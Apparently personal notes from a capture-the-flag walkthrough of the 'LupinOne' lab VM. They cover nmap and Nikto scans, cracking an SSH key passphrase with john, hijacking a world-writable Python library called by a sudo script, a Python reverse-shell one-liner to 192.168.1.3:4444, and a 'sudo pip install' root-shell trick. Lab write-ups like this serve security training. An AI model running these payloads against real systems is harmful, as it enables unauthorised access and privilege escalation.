|     	4B051C78-13E6-52F9-A39E-4C7E49ACB51A	7.5	https://vulners.com/githubexploit/4B051C78-13E6-52F9-A39E-4C7E49ACB51A	*EXPLOIT*
|     	45D138AD-BEC6-552A-91EA-8816914CA7F4	7.5	https://vulners.com/githubexploit/45D138AD-BEC6-552A-91EA-8816914CA7F4	*EXPLOIT*
|     	238D27D0-2B6D-59DE-B1AC-12B79D1C507C	7.5	https://vulners.com/githubexploit/238D27D0-2B6D-59DE-B1AC-12B79D1C507C	*EXPLOIT*
|     	0E08753E-C6D7-5E76-A61F-6CA6F7F87AA8	7.5	https://vulners.com/githubexploit/0E08753E-C6D7-5E76-A61F-6CA6F7F87AA8	*EXPLOIT*
|     	CVE-2025-49812	7.4	https://vulners.com/cve/CVE-2025-49812
|     	MEND:CVE-2026-73637	7.3	https://vulners.com/mend/MEND:CVE-2026-73637
|     	MEND:CVE-2026-44186	7.3	https://vulners.com/mend/MEND:CVE-2026-44186
|     	MEND:CVE-2026-44185	7.3	https://vulners.com/mend/MEND:CVE-2026-44185
|     	MEND:CVE-2026-29168	7.3	https://vulners.com/mend/MEND:CVE-2026-29168
|     	CVE-2026-73637	7.3	https://vulners.com/cve/CVE-2026-73637
|     	CVE-2026-44186	7.3	https://vulners.com/cve/CVE-2026-44186
|     	CVE-2026-44185	7.3	https://vulners.com/cve/CVE-2026-44185
|     	CVE-2026-29168	7.3	https://vulners.com/cve/CVE-2026-29168
|     	CVE-2023-38709	7.3	https://vulners.com/cve/CVE-2023-38709
|     	CNVD-2024-36395	7.3	https://vulners.com/cnvd/CNVD-2024-36395
|     	MEND:CVE-2026-79768	6.9	https://vulners.com/mend/MEND:CVE-2026-79768
|     	MEND:CVE-2026-58415	6.9	https://vulners.com/mend/MEND:CVE-2026-58415
|     	MEND:CVE-2026-43951	6.9	https://vulners.com/mend/MEND:CVE-2026-43951
|     	MEND:CVE-2026-34032	6.9	https://vulners.com/mend/MEND:CVE-2026-34032
|     	MEND:CVE-2026-33857	6.9	https://vulners.com/mend/MEND:CVE-2026-33857
|     	MEND:CVE-2026-33523	6.9	https://vulners.com/mend/MEND:CVE-2026-33523
|     	MEND:CVE-2026-33007	6.9	https://vulners.com/mend/MEND:CVE-2026-33007
|     	MEND:CVE-2025-65082	6.9	https://vulners.com/mend/MEND:CVE-2025-65082
|     	MEND:CVE-2026-44119	6.8	https://vulners.com/mend/MEND:CVE-2026-44119
|     	CVE-2026-43951	6.5	https://vulners.com/cve/CVE-2026-43951
|     	CVE-2026-33523	6.5	https://vulners.com/cve/CVE-2026-33523
|     	CVE-2025-65082	6.5	https://vulners.com/cve/CVE-2025-65082
|     	CNVD-2025-30833	6.5	https://vulners.com/cnvd/CNVD-2025-30833
|     	MEND:CVE-2026-33006	6.3	https://vulners.com/mend/MEND:CVE-2026-33006
|     	CVE-2024-24795	6.3	https://vulners.com/cve/CVE-2024-24795
|     	CNVD-2024-36394	6.3	https://vulners.com/cnvd/CNVD-2024-36394
|     	MEND:CVE-2026-29170	6.1	https://vulners.com/mend/MEND:CVE-2026-29170
|     	CVE-2026-29170	6.1	https://vulners.com/cve/CVE-2026-29170
|     	CVE-2023-45802	5.9	https://vulners.com/cve/CVE-2023-45802
|     	556687CB-7B66-53C5-A79C-84B0ED753C7E	5.9	https://vulners.com/githubexploit/556687CB-7B66-53C5-A79C-84B0ED753C7E	*EXPLOIT*
|     	CVE-2026-44119	5.5	https://vulners.com/cve/CVE-2026-44119
|     	MEND:CVE-2025-66200	5.4	https://vulners.com/mend/MEND:CVE-2025-66200
|     	CVE-2025-66200	5.4	https://vulners.com/cve/CVE-2025-66200
|     	CNVD-2025-30835	5.4	https://vulners.com/cnvd/CNVD-2025-30835
|     	MEND:CVE-2026-42528	5.3	https://vulners.com/mend/MEND:CVE-2026-42528
|     	HTTPD:BAAB4065D254D64A717E8A5C847C7BCA	5.3	https://vulners.com/httpd/HTTPD:BAAB4065D254D64A717E8A5C847C7BCA
|     	HTTPD:8806CE4EFAA6A567C7FAD62778B6A46F	5.3	https://vulners.com/httpd/HTTPD:8806CE4EFAA6A567C7FAD62778B6A46F
|     	CVE-2026-79768	5.3	https://vulners.com/cve/CVE-2026-79768
|     	CVE-2026-58415	5.3	https://vulners.com/cve/CVE-2026-58415
|     	CVE-2026-34032	5.3	https://vulners.com/cve/CVE-2026-34032
|     	CVE-2026-33857	5.3	https://vulners.com/cve/CVE-2026-33857
|     	CVE-2026-33007	5.3	https://vulners.com/cve/CVE-2026-33007
|     	CVE-2022-37436	5.3	https://vulners.com/cve/CVE-2022-37436
|     	CVE-2022-28614	5.3	https://vulners.com/cve/CVE-2022-28614
|     	CVE-2022-28330	5.3	https://vulners.com/cve/CVE-2022-28330
|     	CNVD-2023-30859	5.3	https://vulners.com/cnvd/CNVD-2023-30859
|     	CNVD-2022-53582	5.3	https://vulners.com/cnvd/CNVD-2022-53582
|     	CNVD-2022-51059	5.3	https://vulners.com/cnvd/CNVD-2022-51059
|     	EA6ADD14-D80B-5DC2-9991-1F9663E2D09F	4.8	https://vulners.com/githubexploit/EA6ADD14-D80B-5DC2-9991-1F9663E2D09F	*EXPLOIT*
|     	CVE-2026-33006	4.8	https://vulners.com/cve/CVE-2026-33006
|     	CVE-2026-42528	4.3	https://vulners.com/cve/CVE-2026-42528
|     	CVE-2026-42356	3.7	https://vulners.com/cve/CVE-2026-42356
|     	CDF59E85-8B42-5073-A637-B11580C962DE	3.7	https://vulners.com/githubexploit/CDF59E85-8B42-5073-A637-B11580C962DE	*EXPLOIT*
|     	GHSA-XM48-VPF9-PGMX	0.0	https://vulners.com/github/GHSA-XM48-VPF9-PGMX
|_    	74A7BA4E-D496-587B-A72A-FA0BE663F994	0.0	https://vulners.com/githubexploit/74A7BA4E-D496-587B-A72A-FA0BE663F994	*EXPLOIT*
| http-enum: 
|   /robots.txt: Robots file
|   /image/: Potentially interesting directory w/ listing on 'apache/2.4.48 (debian)'
|_  /manual/: Potentially interesting folder
MAC Address: 08:00:27:5C:9A:A0 (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Oct 15 13:39:24 2026 -- 1 IP address (1 host up) scanned in 39.17 seconds

```


```
 nikto -h http://192.168.0.105       
- Nikto v2.6.0
---------------------------------------------------------------------------
+ Target IP:          192.168.0.105
+ Target Hostname:    192.168.0.105
+ Target Port:        80
+ Platform:           Linux/Unix
+ Start Time:         2026-10-15 13:35:12 (GMT-4)
---------------------------------------------------------------------------
+ Server: Apache/2.4.48 (Debian)
+ ERROR: Failed to check for updates: 403
+ No CGI Directories found (use '-C all' to force check all possible dirs). CGI tests skipped.
+ [999996] /robots.txt: contains 1 entry which should be manually viewed. See: https://developer.mozilla.org/en-US/docs/Glossary/Robots.txt
+ [600050] Apache/2.4.48 appears to be outdated (current is at least 2.4.66).
http://192.168.0.105/+ [999984] /: Server may leak inodes via ETags, header found with file /, inode: 14d, size: 5cd8c2e02d089, mtime: gzip. See: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2003-1418
+ [013587] /: Suggested security header missing: content-security-policy. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP
+ [013587] /: Suggested security header missing: strict-transport-security. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Strict-Transport-Security
+ [013587] /: Suggested security header missing: x-content-type-options. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Content-Type-Options
+ [013587] /: Suggested security header missing: permissions-policy. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Permissions-Policy
+ [013587] /: Suggested security header missing: referrer-policy. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Referrer-Policy
+ [999990] OPTIONS: Allowed HTTP Methods: GET, POST, OPTIONS, HEAD .
- STATUS: Completed 1000 requests (~14% complete, ~31 seconds left): currently in plugin 'Nikto Tests'
- STATUS: Running average: Not enough data.
- STATUS: Completed 1500 requests (~21% complete, ~23 seconds left): currently in plugin 'Nikto Tests'
- STATUS: Running average: Not enough data.
- STATUS: Completed 2000 requests (~28% complete, ~21 seconds left): currently in plugin 'Nikto Tests'
- STATUS: Running average: Not enough data.
+ [002114] /manual/: Web server manual found.
- STATUS: Completed 2500 requests (~35% complete, ~21 seconds left): currently in plugin 'Nikto Tests'
- STATUS: Running average: Not enough data.
+ [750500] /manual/images/: Directory indexing found.
+ [750500] /image/: Directory indexing found.
- STATUS: Completed 3000 requests (~41% complete, ~18 seconds left): currently in plugin 'Nikto Tests'
- STATUS: Running average: Not enough data.
- STATUS: Completed 3500 requests (~48% complete, ~17 seconds left): currently in plugin 'Nikto Tests'
- STATUS: Running average: Not enough data.
- STATUS: Completed 4000 requests (~55% complete, ~15 seconds left): currently in plugin 'Nikto Tests'
- STATUS: Running average: Not enough data.
- STATUS: Completed 4500 requests (~62% complete, ~13 seconds left): currently in plugin 'Nikto Tests'
- STATUS: Running average: Not enough data.
- STATUS: Completed 5000 requests (~69% complete, ~11 seconds left): currently in plugin 'Nikto Tests'
- STATUS: Running average: Not enough data.
- STATUS: Completed 5500 requests (~76% complete, ~9 seconds left): currently in plugin 'Nikto Tests'
- STATUS: Running average: Not enough data.
- STATUS: Completed 6000 requests (~83% complete, ~6 seconds left): currently in plugin 'Nikto Tests'
- STATUS: Running average: Not enough data.
- STATUS: Completed 7000 requests (~97% complete, ~1 seconds left): currently in plugin 'Nikto Tests'
- STATUS: Running average: Not enough data.
+ [007342] /: X-Frame-Options header is deprecated and was replaced with the Content-Security-Policy HTTP header with the frame-ancestors directive. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/X-Frame-Options
+ [007352] /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
- STATUS: Completed 8000 requests: currently in plugin 'Nikto Tests'
- STATUS: Running average: Not enough data.
+ 8116 requests: 16 errors and 14 items reported on the remote host
+ End Time:           2026-10-15 13:41:18 (GMT-4) (366 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested

```


![[Pasted image 20261016000336.png]]


![[Pasted image 20261016000617.png]]


![[Pasted image 20261016001803.png]]


![[Pasted image 20261016001829.png]]


```
                                                                                                                                                          
┌──(root㉿kali)-[/home/kali/Desktop/Projecte]
└─# nano ssh2john id_rsa
                                                                                                                                                             
┌──(root㉿kali)-[/home/kali/Desktop/Projecte]
└─# rm hash.txt               
                                                                                                                                                             
┌──(root㉿kali)-[/home/kali/Desktop/Projecte]
└─# ssh2john id_rsa > hash.txt

                                                                                                                                                             
┌──(root㉿kali)-[/home/kali/Desktop/Projecte]
└─# ls
hash.txt  id_rsa  nmap.txt  Password.txt  reverse-shell.php  ssh2john  users.txt
                                                                                                                                                             
┌──(root㉿kali)-[/home/kali/Desktop/Projecte]
└─# john  --wordlist=/usr/share/wordlists/fasttrack.txt hash.txt
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 2 for all loaded hashes
Cost 2 (iteration count) is 16 for all loaded hashes
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
P@55w0rd!        (id_rsa)     
1g 0:00:00:01 DONE (2026-10-15 14:22) 0.5102g/s 65.30p/s 65.30c/s 65.30C/s Autumn2013..change
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
                                                                                                                                                             
┌──(root㉿kali)-[/home/kali/Desktop/Projecte]
└─# 



```


```
ssh -o KexAlgorithms=+diffie-hellman-group14-sha256 -o HostKeyAlgorithms=+ssh-rsa -o PubkeyAcceptedKeyTypes=+ssh-rsa -i id_rsa icex64@192.168.0.105 
```


![[Pasted image 20261016170703.png]]


![[Pasted image 20261016170855.png]]



```
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.1.3",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);
```




```
icex64@LupinOne:~$ id
uid=1001(icex64) gid=1001(icex64) groups=1001(icex64)
icex64@LupinOne:~$ pwd
/home/icex64
icex64@LupinOne:~$ ls
user.txt
icex64@LupinOne:~$ cat user.txt
    ...,    ,...    ..,.   .,,  *&@@@@@@@@@@&/.    ,,,.   .,..    ...,    ...,  
    ,,,.    .,,,    *&@@%%%%%%%%%%%%%%%%%%%%%%%%%%%&@,.   ..,,    ,,,,    ,,,.  
..,.    ,..,  (@&#%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%&%,.    ..,,    ,...    ..
    .... .@&%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%@  ....    ....    ,...  
    .,#@%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%@  .,..    ,.,.    ...,  
.,,,&%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%@#@.,    .,.,    .,..    .,
...@%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%&@####@*.    ..,,    ....    ,.
   @%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%@@%#######@% .,.,    .,.,    .,.,  
..,,@@%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%@@@@@@@@%#######@@,    ..,.    ,..,    ..
.,,, @@@@@@@@&%%%%%%%%%%%%%&@@@@@@@@@@@@@@@@@@@%%%#####@@,    .,,,    ,,.,    .,
    ..@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%%%%%###@@ .,..    ...,    ....  
...,  .@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%%%%%%%#&@.    ...,    ...,    ..
....   #@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%%%%%%%%%@.    ....    ....    ..
    .,.,@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@&%%%%%%%#@*.,.,    .,.,    ..@@@@
..,.    .@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%%%%%%%#@@    ..,.    ,..*@&&@@.
.,,.    ,.@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%%%%%%%%@@    .,,.    .@&&&@( ,,
    ,.,.  .@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@&%%%%%%%@@%%&@@@, ,,,@&@@@.,,,  
....    ...#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@&&%%%%&%,@%%%%%%%#@@@@@%..    ..
...,    ...,@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@&&&&@,*,,@%%%%%%@@@&@%%@..    ..
    ,,.,    @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@/,***,*,@%%%@@&@@@%%###@ ,,.,  
    .,. @@&&&@@,,/@@@@@@@@@@@@@@@@@@@@@@@@#,,,,,,,,,*,,@%%%@&&@@%%%%%##&* ,...  
.,,, @@&@@&@&@@%,*,*,*,*,***,*,*,***,*,*,*,*,*,*,**,&@%%&@@@&@%%%%%%%%@/.,    .,
  /@@&&&&&&&&&&@@*,,,,,,,,,,,,,,,,,,,,,,*,,,**,%@&%%%%@&&&@%%%%%%%%%@(    ,..,  
 @&@&@&@&@&@&@&&@@@@@(,*,*,,**,*,*,,,*#&@@&%%%%%%%%&@@@@@%%%%%%%%@&..,    .,.,  
@@@&&&&&&&&&&&&&&&&&@@@&&&@@@@&&@@&&@&&&%&%%%%%%%@&&&@&%%%%%%&@,..    ...,    ..
 @&&&@&@&@&@&@&@&@&@&@&@&@&@&&@@@&&&&&&&%&%%%%&@&&@@%%%#&@%..,    .,.,    .,.,  
  @@@@&&&&&&&&&&&&&&&&&&&&&&@&&&&&&&&&&&%%&%@&@&@&@@%..   ....    ....    ,..,  
.,,, *@@&&&@&@&@&@&@&@&&&&&&&&&&&&&&&&&%&&@@&&@....    ,.,    .,,,    ,,..    .,
    ,,,,    .,%@@@@@@@@@@@@@@@@%,  ...,@@&&@(,,    ,,,.   .,,,    ,,.,    .,,.  
    .,.,    .,,,    .,,.   ..,.    ,*@@&&@ ,,,,    ,.,.   .,.,    .,.,    .,.,  
...,    ....    ....    ,..    ,..@@@&@#,..    ....    ,..    ...,    ....    ..
    ....    ....    ...    ....@.,%&@..    ....    ...    ....    ....    ....  
    ...,    ....    ....   .*/,...&.,,,    ....    ....   .,..    ...,    ...,  
.,.,    .,.,    ,,.,    .,../*,,&,,    ,.,,    ,.,,    ..,    .,.,    .,.,    ,,

3mp!r3{I_See_That_You_Manage_To_Get_My_Bunny}
icex64@LupinOne:~$ sudo -l
Matching Defaults entries for icex64 on LupinOne:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User icex64 may run the following commands on LupinOne:
    (arsene) NOPASSWD: /usr/bin/python3.9 /home/arsene/heist.py
icex64@LupinOne:~$ ls -la /home/arsene/
total 40
drwxr-xr-x 3 arsene arsene 4096 Oct  4  2021 .
drwxr-xr-x 4 root   root   4096 Oct  4  2021 ..
-rw------- 1 arsene arsene   47 Oct  4  2021 .bash_history
-rw-r--r-- 1 arsene arsene  220 Oct  4  2021 .bash_logout
-rw-r--r-- 1 arsene arsene 3526 Oct  4  2021 .bashrc
-rw-r--r-- 1 arsene arsene  118 Oct  4  2021 heist.py
drwxr-xr-x 3 arsene arsene 4096 Oct  4  2021 .local
-rw-r--r-- 1 arsene arsene  339 Oct  4  2021 note.txt
-rw-r--r-- 1 arsene arsene  807 Oct  4  2021 .profile
-rw------- 1 arsene arsene   67 Oct  4  2021 .secret
icex64@LupinOne:~$ cat /home/arsene/note.txt
Hi my friend Icex64,

Can you please help check if my code is secure to run, I need to use for my next heist.

I dont want to anyone else get inside it, because it can compromise my account and find my secret file.

Only you have access to my program, because I know that your account is secure.

See you on the other side.

Arsene Lupin.
icex64@LupinOne:~$ cat /home/arsene/heist.py
import webbrowser

print ("Its not yet ready to get in action")

webbrowser.open("https://empirecybersecurity.co.mz")
icex64@LupinOne:~$ ls -la /usr/bin/python3.9/
ls: cannot access '/usr/bin/python3.9/': Not a directory
icex64@LupinOne:~$ ls -la /usr/bin/python3.9 | grep webbrowser.py
icex64@LupinOne:~$ nano /usr/lib/python3.9/webbrowser.py
icex64@LupinOne:~$ ls -l /usr/lib/python3.9/webbrowser.py
ls -ld /usr/lib/python3.9
id
-rwxrwxrwx 1 root root 24087 Oct 16 07:17 /usr/lib/python3.9/webbrowser.py
drwxr-xr-x 31 root root 12288 Oct  4  2021 /usr/lib/python3.9
uid=1001(icex64) gid=1001(icex64) groups=1001(icex64)

```


![[Pasted image 20261016180958.png]]


```
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.1.3",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);

```

![[Pasted image 20261016181044.png]]



![[Pasted image 20261016181107.png]]


![[Pasted image 20261016181139.png]]


```
TF=$(mktemp -d)  
  
echo "import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')" > $TF/setup.py  
  
sudo pip install $TF

```


```
echo "import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')" > $TF/setup.py
```

sudo pip install $TF

TF=$(mktemp -d)